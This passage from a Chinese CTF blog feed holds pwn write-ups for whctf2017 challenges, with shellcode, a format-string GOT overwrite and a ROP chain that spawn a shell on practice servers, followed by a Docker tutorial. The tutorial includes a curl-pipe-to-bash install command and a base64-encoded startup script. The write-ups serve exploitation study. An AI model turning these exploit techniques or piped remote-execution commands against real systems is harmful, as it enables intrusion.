class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">mov rdi ,0x68732f2f6e69622f</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">push rsi</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b&quot;\x48\x31\xC0\x6A\x3B\x58\x48\x31\xFF\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x48\x31\xF6\x56\x57\x54\x5F\x48\x31\xD2\x0F\x05&quot;</span></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xB66</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice:\n&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;input your note, no more than 250 characters\n&quot;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice:\n&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131726043.png" alt="image-20221213172644320"></p><h2 id="whctf2017-easypwn">whctf2017_easypwn</h2><h3 id="保护策略-v3">保护策略</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301822473.png" alt="image-20221230182239349" style="zoom:50%;" /><h3 id="漏洞所在-v3">漏洞所在</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301823966.png" alt="image-20221230182343891" style="zoom:50%;" /><p>v3可被覆盖控制，而v3是format参数，可控就代表着存在格式化字符串漏洞。</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301831494.png" alt="image-20221230183118429" style="zoom:50%;" /><p>snprintf会将s的数据拷贝0x7d0到v2上面，但是s和v2仅相离0x400，也就是说如果s写入0x400的话，拷贝到v2里面的时候就会溢出0x18个字节(v2和v3仅相距0x3e8个字节)从而控制v3，触发格式化字符串漏洞。</p><h3 id="利用思路-v3">利用思路</h3><p>relro保护开的是partial relro，这意味着可以篡改GOT表，而程序的此处莫名其妙的出现了一个free函数(如下)，并且free掉堆块的内容可控，很明显是想让我们劫持free的got表为system，然后堆块里面写入/bin/sh最后执行free获取shell</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301905510.png" alt="image-20221230190529433"></p><p>利用的时候有几个点需要注意一下：</p><p>1 就是格式化字符串利用的时候，发现0x3e8后不能直接触发漏洞，需要填充两个字符串才能利用(这里是试出来的，原因未知)</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301909592.png" alt="image-20221230190941547"></p><p>2 本题属于snprintf执行中的格式化字符串漏洞，snprintf是一个字符一个字符来处理的，可能是采取了一种循环遍历的方式，所以即使最初调用snprintf的时候format是%s，但后续的操作中format被改变了，然后再取格式化字符的时候触发了漏洞。</p><p>3 snprintf函数的format是在第三个参数的位置，所以算栈顶偏移的时候不是和以前加6，而是加4。</p><p>4 我这里是跑了三次循环，每次改写free函数的got表两个字节，三次下来就写了system的6字节地址。</p><p>5 这里写入数据的话，肯定是要减去前面发送的垃圾数据0x3e8个a,但是后面的0x16不知道咋来的，但这里也是可以试出来的，先减去0x3e8后，发现自己要写的值和实际写入的值差了0x16，那就在exp里多减0x16就能得到正确的值。</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301916047.png" alt="image-20221230191633995"></p><p>PS：exp不是一定能打通，因为如果libc地址的低位比较小的话，会导致payload后面没有对齐，不过这个概率不大，没打通的话多跑两次就行</p><h3 id="EXP-v3">EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;b&quot;</span>,<span class="string">&quot;node4.buuoj.cn:27618&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input Your Code:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xC05</span>)</span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">0x3e8</span>+<span class="string">&quot;b&quot;</span>*<span class="number">2</span>+<span class="string">&quot;%396$p%397$p&quot;</span><span class="comment"># libc addr 393+4</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome To WHCTF2017:\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;397$p\n&quot;</span>)</span><br><span class="line">base_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0xda0</span></span><br><span class="line">log_addr(<span class="string">&#x27;base_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x20830</span><span class="comment">#0x20840</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">value=(libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">x=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    log_info(<span class="built_in">hex</span>(value%<span class="number">0x10000</span>))</span><br><span class="line">    payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x3e8</span>+<span class="string">b&quot;bb%&quot;</span>+<span class="built_in">str</span>(value%<span class="number">0x10000</span>-<span class="number">0x3e8</span>-<span class="number">0x16</span>).encode()+<span class="string">b&quot;c%133$hn&quot;</span>+p64(base_addr+e.got[<span class="string">&#x27;free&#x27;</span>]+i*<span class="number">2</span>)</span><br><span class="line">    value=value&gt;&gt;<span class="number">16</span></span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input Your Code:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Welcome To WHCTF2017:\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xD40</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input Your Code:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input Your Name:\n&quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301808658.png" alt="image-20221230180818030" style="zoom:50%;" /><h2 id="whctf2017-rc4">whctf2017_rc4</h2><h3 id="保护策略-v4">保护策略</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212302213510.png" alt="image-20221230221340383" style="zoom:50%;" /><h3 id="漏洞所在-v4">漏洞所在</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212302214459.png" alt="image-20221230221432405" style="zoom: 50%;" /><p>这里存在了一个无法触发的格式化字符串漏洞，因为v1取的是一个字节的数据，但是rand生成的随机数是四字节的，无论如何也无法通过这个If检查触发格式化字符串漏洞</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212302216225.png" alt="image-20221230221652145" style="zoom:50%;" /><p>这里存在一个未初始化漏洞，如果进入这个函数不选择a b或者c的话，那么会跳转到LABEL_12的地方，而v2这个位置则是一个canary(这里我是先看roderick师傅写的wp，说可以利用这里泄露出来canary，然后调试了一下发现确实如此，如果单纯看代码的话确实无法发现这里是一个canary)</p><p>这个canary又被放到了*0x6020D8的位置，而后有个打印函数将0x6020D0开始16个字节进行了泄露，由此得到了canary</p><p>下图展示的代码部分还存在一个明显的栈溢出漏洞</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212302222846.png" alt="image-20221230222229763" style="zoom:50%;" /><h3 id="利用思路-v4">利用思路</h3><p>先泄露canary，然后利用栈溢出打ret2libc，我这里选择返回的是bss段上，进行了一个栈迁移，最后迁移过去的执行流是调用了execve(“/bin/sh\x00”,0,0) 当时用system发现没打通，索性就换成execve系统调用了</p><h3 id="EXP-v4">EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26330&quot;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x0000000000401283</span></span><br><span class="line">bss_addr=<span class="number">0x6020D8</span></span><br><span class="line">leave_ret=<span class="number">0x401218</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;u&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">16</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;canary&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug(p,<span class="number">0x401219</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x108</span>+p64(canary)[::-<span class="number">1</span>]+p64(bss_addr-<span class="number">8</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(e.got[<span class="string">&#x27;puts&#x27;</span>])+p64(e.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+=p64(pop_rdi)+p64(bss_addr)+p64(e.plt[<span class="string">&#x27;gets&#x27;</span>])+p64(leave_ret)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;d&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;d&quot;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">puts_addr=recv_libc()</span><br><span class="line">sys_addr,bin_sh_addr=local_search(<span class="string">&quot;puts&quot;</span>,puts_addr,libc)</span><br><span class="line">pop_rdx=<span class="number">0x0000000000001b92</span>+(puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">pop_rsi=<span class="number">0x00000000000202e8</span>+(puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">execve=<span class="number">0x00000000000cc770</span>+(puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload=p64(pop_rdi)+p64(bin_sh_addr)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx)+p64(<span class="number">0</span>)+p64(execve)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文章">参考文章</h2><p><a href="https://blog.csdn.net/seaaseesa/article/details/106694651">(whctf2017_stackoverflow ha1vk的博客-CSDN博客_whctf2017stackoverflow</a></p><p><a href="https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write#%E4%BB%BB%E6%84%8F%E5%86%99">IO FILE 之任意读写 « 平凡路上 (ray-cp.github.io)</a></p><p>[WHCTF 2017 note_sys | giantbranch’s blog](<a href="https://www.giantbranch.cn/2017/12/11/WHCTF">https://www.giantbranch.cn/2017/12/11/WHCTF</a> 2017 note_sys/)</p><p><a href="https://blog.csdn.net/seaaseesa/article/details/103089382">(44条消息) 攻防世界PWN之EasyPwn题解_ha1vk的博客-CSDN博客_pwn-sai_easy 解题思路</a></p><p><a href="https://roderickchan.github.io/2022/04/15/BUUCTF-pwn-tasks-20/#whctf2017-rc4">BUUCTF-pwn合集 - Lynne’s House (roderickchan.github.io)</a></p>]]></content>
      
      
      <categories>
          
          <category> buu刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IO_FILE attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对docker学习进行的小总结</title>
      <link href="/posts/80648483.html"/>
      <url>/posts/80648483.html</url>
      
        <content type="html"><![CDATA[<p>因为打CTF pwn题的时候，经常遇见本地程序的libc与远程服务器那边程序所依赖的libc不匹配的情况，尽管可以用patchelf和glibc-all-in-one来给程序patch一个libc。但是patchelf似乎有点小bug，为了防止比赛的时候在这个地方掉链子，因此可以采用在docker里跑不同版本的ubuntu。</p><p>同时随着时间的推移，自己也从一个拉跨的做题人偶尔客串了一下拉跨的出题人，因此需要打包一个题目环境，还得学习一下docker的几个基本配置文件。</p><p>本文是对我学习docker做了一个简单的小总结。</p><h3 id="docker-容器-镜像">docker 容器 镜像</h3><p>Docker是一个开源的容器编排工具，它允许开发人员在自己的计算机上打包和运行应用程序。</p><p>容器是一种轻量级的虚拟化技术，它允许在单个操作系统中运行多个隔离的应用程序。容器运行时会在镜像的基础上创建一个可写层，而镜像本身是只读的。</p><p>镜像是容器运行时所需要的文件系统，它包含了容器运行时需要的所有软件，配置文件和环境变量等。镜像是静态的，不能运行命令，只能被用来创建容器。</p><p>总之，Docker是一种工具，容器是运行在Docker上的一种虚拟化技术，镜像是容器运行所需要的文件系统。</p><h2 id="docker安装">docker安装</h2><p>一条命令安装docker:</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure><p>如果没有安装curl的话，先安装curl:</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install curl</span><br></pre></td></tr></table></figure><h2 id="ubuntu不同版本对应默认libc：">ubuntu不同版本对应默认libc：</h2><blockquote><p>需要什么版本libc，接下来下载对应的版本镜像即可</p><p>22.04----&gt;2.35-0ubuntu3</p><p>21.04----&gt;2.33-0ubuntu5</p><p>20.04----&gt;2.31-0ubuntu9.7</p><p>21.10----&gt;2.34-0ubuntu3.2</p><p>18.04----&gt;2.27-3ubuntu1.5</p></blockquote><h2 id="下载镜像">下载镜像</h2><p>roderick师傅编译了很多版本的镜像,在下面这个链接下载(使用roderick师傅的镜像，运行起来的容器里面要用gdb.attach的话，需要指定终端tmux，roderick师傅把一些快捷键给改了，具体请在容器里输入cat ~/.tmux.conf 来查看）</p><p><a href="https://hub.docker.com/r/roderickchan/debug_pwn_env/tags">https://hub.docker.com/r/roderickchan/debug_pwn_env/tags</a></p><p><img src="../img/2706180-20220516184739994-1663794444.png" alt=""></p><p>点这个，然后直接粘到虚拟机上就开始下载了（注意权限问题）。</p><p>我简单说一下这个docker是咋用的</p><blockquote><p>刚刚下载下来的镜像，要实例化成容器（也就是让容器运行起来）。当容器运行起来之后，我们就相当于有了&quot;另一个版本的ubuntu&quot;。如果你想退出它可以用exit，此时它依然是运行状态，如果你停止了一个容器，那么此时它处于停止状态，不过不管是你exit还是stop还是关机，容器依然存在（里面你新下载的文件也存在），可以使用start开启停止状态的容器，如果删除了容器，则里面你新下载的文件会消失（容器原本的文件不会消失）</p></blockquote><h2 id="搜索镜像">搜索镜像</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker search 关键字</span><br></pre></td></tr></table></figure><p>使用docker search命令搜索官房仓库中的共享镜像。</p><h2 id="拉取镜像">拉取镜像</h2><p>对于Docker镜像来说，如果下载镜像时不指定标签，默认会下载仓库中最新版本的镜像，即选择<br>标签latest。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull 仓库名称[:标签]</span><br></pre></td></tr></table></figure><h2 id="查看镜像或者容器">查看镜像或者容器</h2><p>查看所有容器</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker ps -a</span><br></pre></td></tr></table></figure><p>查看正在运行的容器</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker ps</span><br></pre></td></tr></table></figure><p>查看已有镜像：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker images</span><br></pre></td></tr></table></figure><h2 id="启动容器">启动容器</h2><p>这意味着是在把一个镜像给实例化（除非删除，不然启动的容器不会消失（即使主机重启,或者输入stop，或者exit）</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker run -it IMAGE ID /bin/bash</span><br></pre></td></tr></table></figure><p>启动已停止的容器(启动被stop暂停的容器)</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker start  CONTAINER ID</span><br></pre></td></tr></table></figure><h2 id="进入容器-退出容器">进入容器&amp;&amp;退出容器</h2><p>进入容器的前提是容器必须启动（也就是用docker ps可以看到容器)，如果容器处于了停止状态，需要用docker start将其启动，然后再进入容器.</p><p>下面两个命令都可以进入容器，二者区别在于前者使用之后执行exit会顺便把容器停止，而后者执行exit，容器依然在运行。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker attach  CONTAINER ID</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it CONTAINER ID /bin/bash</span><br></pre></td></tr></table></figure><p>如果要以root权限进入容器的话，命令如下</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it -u root CONTAINER ID /bin/bash</span><br></pre></td></tr></table></figure><p><strong>退出容器执行<code>exit</code>即可，只要容器被启动，则输入上述命令就能再次进入。</strong></p><h2 id="删除镜像或者容器">删除镜像或者容器</h2><p>删除指定的容器</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker rm -f CONTAINER ID</span><br></pre></td></tr></table></figure><p>删除指定的镜像（删除镜像之前需要先停止容器，然后先删容器后删镜像）</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker rmi IMAGE ID</span><br></pre></td></tr></table></figure><p>下面的命令可以清理掉所有处于终止状态的容器。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker container prune</span><br></pre></td></tr></table></figure><p>删除所有镜像(如果被实例化的镜像是不能删除的)</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker system prune -a</span><br></pre></td></tr></table></figure><h2 id="停止容器">停止容器</h2><p>请注意停止容器和删除容器的区别：停止容器，仅仅是用docker ps查看不到了（因为他不再运行了，但它依然存在，只不过属于停止状态，用docker ps -a可以查看到）</p><p>停止容器</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker stop CONTAINER ID</span><br></pre></td></tr></table></figure><h2 id="将文件从主机复制到docker">将文件从主机复制到docker</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker cp file CONTAINER ID:Destination_directory</span><br></pre></td></tr></table></figure><h2 id="挂载命令">挂载命令</h2><p>可以通过挂载的方式来让宿主机和Docker直接来共享文件。（下面这个方法只适用于创建新的容器时同时创建共享目录，不适于后期添加共享目录）</p><p>创建容器时执行Docker Volume</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -itd --volume /tmp/source:/tmp/destination --name test ubuntu/nginx bash</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker run -it --volume /home/hacker/Desktop/ROPgadget:/home/roderick/ROPgadget --name test roderickchan/debug_pwn_env:22.04</span><br></pre></td></tr></table></figure><p>解释:将本机上的ROPgadget文件复制到容器里面,命名为test。</p><p>本人也只是刚开始接触docker的使用，如果上述理解又什么问题，欢迎各位师傅斧正，如果以后用到了docker的其他用法，我会更新这篇文章。</p><p>下面为后来的更新部分：</p><h2 id="NAMES有些地方可以代替CONTAINER-ID">NAMES有些地方可以代替CONTAINER ID</h2><p>上面的命令我一直以为 CONTAINER ID要输入下面这个东西才行</p><p><img src="../img/Ih2DLZlwiQbz1qu.png" alt="image-20220621182948850"></p><p>刚才我试了一下发现也可以输入NAMES来代替，也就是下面这个东西。</p><p><img src="../img/OdYqF5tSKkEmwHM.png" alt="image-20220621183420059"></p><p>以启动这个glibc2.33的容器举例，重新启动docker的时候，输入 sudo docker start  glibc2.33即可。</p><h2 id="容器的重命名">容器的重命名</h2><p>如果最开始创建容器的时候没有进行命名，那么就会随机给这个容器分配一个名字，之后可以通过下面这个命令给容器重命名（docker1为容器原本的名字，docker2为容器的新名字）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker rename docker1 docker2</span><br></pre></td></tr></table></figure><h2 id="docker的基本配置文件">docker的基本配置文件</h2><p>在出题的时候，需要去部署一下docker，一般来说用那个ctf_xinetd项目是比较方便的，相关用法不做介绍了，网上一搜一堆。</p><p>主要是简单说一下几个配置文件的作用以及代码的简单分析</p><p>我找了之前出过的一个题目的docker文件，来解释一下</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301122106949.png" alt="image-20230112210646788"></p><p>有以上几个基本的配置文件</p><h4 id="Dockerfile">Dockerfile</h4><p>用于构建镜像的配置文件，里面包含了构建镜像所需的各种指令，如配置环境，安装软件，配置启动命令等。</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">18.04</span> <span class="comment">#该指令告诉Docker我们要在基于Ubuntu 18.04镜像进行操作，如果你本地没有该镜像，Docker会去Docker hub上下载</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install -y lib32z1 xinetd</span></span><br><span class="line"><span class="comment">#上述指令首先将ubuntu的镜像源替换为清华大学的镜像源，更换镜像源的目的是为了更快的下载软件包</span></span><br><span class="line"><span class="comment">#其次更新了系统软件包，确保系统是最新的状态</span></span><br><span class="line"><span class="comment">#最后安装libc32z1和xinetd两个软件包</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -m ctf <span class="comment">#创建名为ctf的用户，-m表示创建用户的同时创建用户的主目录</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /home/ctf <span class="comment">#将工作目录设置为/home/ctf</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cp</span> -R /lib* /home/ctf &amp;&amp; \ </span></span><br><span class="line">    cp -R /usr/lib* /home/ctf</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> /home/ctf/dev &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mknod</span> /home/ctf/dev/null c 1 3 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mknod</span> /home/ctf/dev/zero c 1 5 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mknod</span> /home/ctf/dev/random c 1 8 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mknod</span> /home/ctf/dev/urandom c 1 9 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 666 /home/ctf/dev/*</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> /home/ctf/bin &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> /bin/sh /home/ctf/bin &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> /bin/ls /home/ctf/bin &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> /bin/cat /home/ctf/bin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./ctf.xinetd /etc/xinetd.d/ctf <span class="comment">#将本地的ctf.xinetd文件复制到容器的/etc/xinetd.d/ctf下</span></span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./start.sh /start.sh <span class="comment">#将本地的start.sh文件复制到容器的根目录下</span></span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;Blocked by ctf_xinetd&quot;</span> &gt; /etc/banner_fail</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /start.sh <span class="comment">#给start.sh可执行权限</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./bin/ /home/ctf/</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> -R root:ctf /home/ctf &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> -R 750 /home/ctf &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 740 /home/ctf/flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/start.sh&quot;</span>] <span class="comment">#在容器启动时执行/start.sh文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">9999</span> <span class="comment">#将容器的9999端口暴露出来</span></span><br></pre></td></tr></table></figure><p>上面出现的关键词如下：</p><ol><li><code>FROM</code>: 指定基础镜像。</li><li><code>RUN</code>: 在镜像中执行命令。</li><li><code>WORKDIR</code>: 指定工作目录。</li><li><code>COPY</code>: 从本地主机复制文件/文件夹到容器。</li><li><code>CMD</code>: 容器启动时运行的命令。</li><li><code>EXPOSE</code>: 暴露容器的端口。</li></ol><p>关于这个 <code>EXPOSE 9999</code> ，指的是运行的服务可以通过9999端口进行访问，但这不意味着自动将容器的9999端口映射到主机端口，EXPOSE主要是让构建镜像的人和运行容器的人有一个明确的了解，这个容器上的端口哪些提供服务，并且如果需要的话可以运行容器的时候把这些端口映射到主机端口上。当然，这不算强制的，这只是一个建议或者提示，依然可以不按照EXPOSE声明的端口来使用，你可以使用自己需要的端口映射容器端口到主机上。</p><h4 id="docker-compose-yml">docker-compose.yml</h4><p>该文件用来配置和启动多容器Docker应用程序的配置文件，可以在一个文件中定义所有容器，并在所有容器之间定义连接。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version: &#x27;3&#x27; #指定了Docker Compose文件格式的版本</span><br><span class="line"></span><br><span class="line">services:   #    定义了一个服务部署的集合</span><br><span class="line">    pwn: # 定义了一个名为pwn的服务</span><br><span class="line">        build: ./ #   指定了Docker Compose应该使用当前目录下的Dockerfile来构建镜像</span><br><span class="line">        image: pwn #  镜像的名称为pwn</span><br><span class="line">        ports:</span><br><span class="line">            - &quot;8888:9999&quot;  #将容器中的9999端口映射到主机的8888端口</span><br><span class="line">        pids_limit: 1024</span><br><span class="line">        # cpus: 0.5</span><br><span class="line">        container_name: pwn #容器的名称为pwn</span><br><span class="line">        restart: unless-stopped</span><br><span class="line">        # privileged: true</span><br></pre></td></tr></table></figure><h4 id="start-sh"><a href="http://start.sh">start.sh</a></h4><p>主要在构建完镜像后运行在容器中的脚本，用于在容器启动时进行初始化操作。可以在Dockerfile文件中配置其作为容器启动时的入口点，从而完成一些必要的配置。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"># Add your startup script</span><br><span class="line">echo dXNlcj1gbHMgL2hvbWVgCmlmIFsgISAkREFTRkxBRyBdO3RoZW4KIGVjaG8gZmxhZ3tURVNUX0RBU0ZMQUd9fHRlZSAvaG9tZS8kdXNlci9mbGFnIC9mbGFnCmVsc2UKIGVjaG8gJERBU0ZMQUd8dGVlIC9ob21lLyR1c2VyL2ZsYWcgL2ZsYWcKZmkKY2hvd24gcm9vdDokdXNlciAvaG9tZS8kdXNlci9mbGFnIC9mbGFnCmNobW9kIDc0MCAvaG9tZS8kdXNlci9mbGFnIC9mbGFnCg==|base64 -d|sh;</span><br><span class="line"># DO NOT DELETE</span><br><span class="line">/etc/init.d/xinetd start; #启动xinetd服务</span><br><span class="line">sleep infinity;</span><br></pre></td></tr></table></figure><p>上面是被base64编码过了，然后解码之后内容如下</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">user=`ls /home`</span><br><span class="line">if [ ! $DASFLAG ];then</span><br><span class="line"> echo flag&#123;TEST_DASFLAG&#125;|tee /home/$user/flag /flag</span><br><span class="line">else</span><br><span class="line"> echo 